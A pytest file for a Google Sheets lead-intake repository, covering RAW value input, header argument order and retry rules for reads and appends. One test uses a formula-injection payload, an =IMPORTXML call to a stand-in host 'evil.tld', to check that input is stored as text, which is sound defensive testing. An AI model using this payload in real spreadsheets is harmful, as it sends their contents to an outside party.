"""Write path of the intake SheetsRepo: RAW input, and which calls retry.

Both properties are load-bearing and neither is visible from the row contents,
so these assert the shape of the API call rather than what ends up in the sheet.
"""
import pytest

from app.domain.lead import ExtractedLead
from app.infrastructure import sheets_repo as sr
from app.infrastructure.sheets_repo import SheetsRepo


class _JsonResponse:
    """A Sheets API error that arrives as JSON — quota errors do."""

    def __init__(self, code):
        self._code = code

    def json(self):
        return {"error": {"code": self._code, "message": "boom", "status": "X"}}


class _HtmlResponse:
    """How Google actually answers a 5xx: an HTML page from the front end.

    There is no `{"error": {...}}` to parse, so gspread falls back to `code = -1`
    and a retry keyed on `exc.code` alone would never fire.
    """

    def __init__(self, status_code=502):
        self.status_code = status_code
        self.text = "<!DOCTYPE html><title>Error 502 (Server Error)!!1</title>"

    def json(self):
        raise ValueError("Expecting value: line 1 column 1 (char 0)")


def _json_error(code):
    return sr.APIError(_JsonResponse(code))


def _html_error(status_code=502):
    return sr.APIError(_HtmlResponse(status_code))


class _FakeWorksheet:
    """Fails the first `fail_times` calls of `failing` with `error()`."""

    def __init__(self, failing=(), fail_times=0, error=None, header=None):
        self.appends = []
        self.updates = []
        self.calls = {}
        self._failing = set(failing)
        self._fail_times = fail_times
        self._error = error or (lambda: _html_error(502))
        self._header = header

    def _tick(self, name):
        self.calls[name] = self.calls.get(name, 0) + 1
        if name in self._failing and self.calls[name] <= self._fail_times:
            raise self._error()

    def row_values(self, _row):
        self._tick("row_values")
        return self._header if self._header is not None else list(sr.COLUMNS)

    def col_values(self, _col):
        self._tick("col_values")
        return ["id", "1", "2"]

    def update(self, values, range_name=None, **kw):
        # Same argument order as the real gspread 6 Worksheet.update — a fake that
        # accepted them the other way round would have blessed the swapped call.
        self._tick("update")
        self.updates.append((values, range_name, kw))

    def append_row(self, row, **kw):
        self._tick("append_row")
        self.appends.append((row, kw))


def _repo(ws):
    """A repo bound to a fake sheet — __init__ would authorize over the network."""
    repo = SheetsRepo.__new__(SheetsRepo)
    repo._ws = ws
    return repo


def _lead(vacancy="Backend Engineer, Алматы"):
    return ExtractedLead(platform="hh", target="https://hh.ru/vacancy/1",
                         vacancy_context=vacancy, raw_text="исходный текст")


def test_append_stores_input_as_raw_not_as_a_formula():
    """`raw_text` is someone else's forwarded message; `vacancy_context` is model
    output over a scraped page. USER_ENTERED would make a leading `=` a live
    formula, and `=IMPORTXML(...)` sends the sheet's contents to an outside host.
    """
    ws = _FakeWorksheet()
    _repo(ws).append_lead(_lead('=IMPORTXML("https://evil.tld/?d="&A2;"//x")'))

    (row, kw), = ws.appends
    assert kw["value_input_option"] == "RAW"
    assert '=IMPORTXML("https://evil.tld/?d="&A2;"//x")' in row


def test_a_missing_header_is_written_back_in_the_right_argument_order():
    """First-time setup: the only path that writes the header row.

    gspread 6 takes (values, range_name); this call still had gspread 5's order,
    so a fresh sheet got `values="A1"` and `range_name=[COLUMNS]`.
    """
    ws = _FakeWorksheet(header=["что-то", "своё"])
    _repo(ws).append_lead(_lead())

    (values, range_name, _), = ws.updates
    assert values == [list(sr.COLUMNS)]
    assert range_name == "A1"


def test_a_matching_header_is_left_alone():
    ws = _FakeWorksheet()
    _repo(ws).append_lead(_lead())
    assert ws.updates == []


def test_a_transient_read_failure_is_retried(monkeypatch):
    """An unretried blip costs the user their forwarded link with nothing saved."""
    monkeypatch.setattr(sr.time, "sleep", lambda _s: None)
    ws = _FakeWorksheet(failing=("row_values",), fail_times=2)

    _repo(ws).append_lead(_lead())

    assert ws.calls["row_values"] == 3
    assert len(ws.appends) == 1


def test_an_html_502_on_a_read_is_retried(monkeypatch):
    monkeypatch.setattr(sr.time, "sleep", lambda _s: None)
    ws = _FakeWorksheet(failing=("col_values",), fail_times=2,
                        error=lambda: _html_error(503))

    _repo(ws).append_lead(_lead())

    assert ws.calls["col_values"] == 3


def test_a_permission_error_on_a_read_is_not_retried():
    """403 means the sheet isn't shared with the service account — surface it."""
    ws = _FakeWorksheet(failing=("row_values",), fail_times=99,
                        error=lambda: _json_error(403))

    with pytest.raises(sr.APIError):
        _repo(ws).append_lead(_lead())

    assert ws.calls["row_values"] == 1


def test_the_append_itself_is_never_retried(monkeypatch):
    """A retried append can duplicate the row when only the response was lost.

    A duplicated lead is a second identical message to the same recruiter; a lost
    one just means resending the link. So this call gets exactly one attempt.
    """
    monkeypatch.setattr(sr.time, "sleep", lambda _s: None)
    ws = _FakeWorksheet(failing=("append_row",), fail_times=1)

    with pytest.raises(sr.APIError):
        _repo(ws).append_lead(_lead())

    assert ws.calls["append_row"] == 1
    assert ws.appends == []
